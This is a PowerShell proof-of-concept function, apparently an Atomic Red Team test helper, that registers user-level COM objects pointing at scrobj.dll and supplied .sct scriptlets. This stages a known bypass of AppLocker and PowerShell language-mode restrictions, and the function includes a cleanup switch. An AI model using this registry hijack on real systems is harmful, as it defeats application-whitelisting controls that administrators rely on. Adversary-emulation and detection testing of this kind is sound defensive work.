function Stage-RLTestCase {
<#
.SYNOPSIS
	Stage & clean DotNetToJScript PowerShell language mode bypass POC.

	Resources:
	  - @_xpn_ => https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/
	  - @tiraniddo => https://github.com/tyranid/DotNetToJScript

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER EnableRLSCT
	Full path to sct which will enable RestrictedLanguage.

.PARAMETER DisableRLSCT
	Full path to sct which will enable FullLanguage.

.PARAMETER Clean
	Using this switch statement will clean up registry artifacts.

.EXAMPLE
	C:\PS> Stage-RLTestCase -EnableRLSCT C:\Some\Path\EnableRL.sct -DisableRLSCT C:\Some\Path\DisableRL.sct

.EXAMPLE
	C:\PS> Stage-RLTestCase -Clean
#>
	[CmdletBinding(DefaultParameterSetName='Stage')]
	param(
		[Parameter(ParameterSetName='Stage',Mandatory=$true)]
		[String]$EnableRLSCT,
		[Parameter(ParameterSetName='Stage',Mandatory=$true)]
		[String]$DisableRLSCT,
		[Parameter(ParameterSetName='Clean',Mandatory=$true)]
		[Switch]$Clean
	)

	$EnableRLSCTGUID = "AAAA1111-0000-0000-0000-0000FEEDACDC"
	$DisableRLSCTGUID = "AAAA2222-0000-0000-0000-0000FEEDACDC"

	function Set-COMProgId {
		param(
			[Parameter(Mandatory = $True)]
			[ValidateSet(
				'EnableRL',
				'DisableRL'
			)]
			[String]$Type,
			[Parameter(Mandatory = $False)]
			[Switch]$Clean
		)

		if ($Type -eq "EnableRL") {
			$ProgId = "EnableRL"
			$RandGUID = $EnableRLSCTGUID
		} else {
			$ProgId = "DisableRL"
			$RandGUID = $DisableRLSCTGUID
		}

		if ($Clean) {
			Remove-Item -Path "HKCU:\Software\Classes\$ProgId" -Recurse -Force
		} else {
			New-Item -Path "HKCU:\Software\Classes\$ProgId" | Out-Null
			New-Item -Path "HKCU:\Software\Classes\$ProgId\CLSID" | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Classes\$ProgId" -Name "(default)" -Value "$ProgId" | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Classes\$ProgId\CLSID" -Name "(default)" -Value "{$RandGUID}" | Out-Null
		}
	}

	function Set-Scriptlet {
		param(
			[Parameter(Mandatory = $True)]
			[ValidateSet(
				'EnableRL',
				'DisableRL'
			)]
			[String]$Type,
			[Parameter(Mandatory = $False)]
			[String]$Path,
			[Parameter(Mandatory = $False)]
			[Switch]$Clean
		)

		if ($Type -eq "EnableRL") {
			$RandGUID = $EnableRLSCTGUID
		} else {
			$RandGUID = $DisableRLSCTGUID
		}

		if ($Clean) {
			Remove-Item -Path "HKCU:\Software\Classes\CLSID\{$RandGUID}" -Recurse -Force
		} else {
			New-Item -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}" | Out-Null
			New-Item -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}\InprocServer32" | Out-Null
			New-Item -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}\ProgID" | Out-Null
			New-Item -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}\ScriptletURL" | Out-Null
			New-Item -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}\VersionIndependentProgID" | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}\InprocServer32" -Name "(default)" -Value "C:\WINDOWS\system32\scrobj.dll" | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}\ScriptletURL" -Name "(default)" -Value $Path | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$RandGuid}\VersionIndependentProgID" -Name "(default)" -Value "AtomicRedTeam" | Out-Null
		}
	}

	# Main
	if ($Clean) {
		Set-COMProgId -Type EnableRL -Clean
		Set-COMProgId -Type DisableRL -Clean
		Set-Scriptlet -Type EnableRL -Clean
		Set-Scriptlet -Type DisableRL -Clean
	} else {
		Set-COMProgId -Type EnableRL
		Set-COMProgId -Type DisableRL
		Set-Scriptlet -Type EnableRL -Path $EnableRLSCT
		Set-Scriptlet -Type DisableRL -Path $DisableRLSCT
	}
}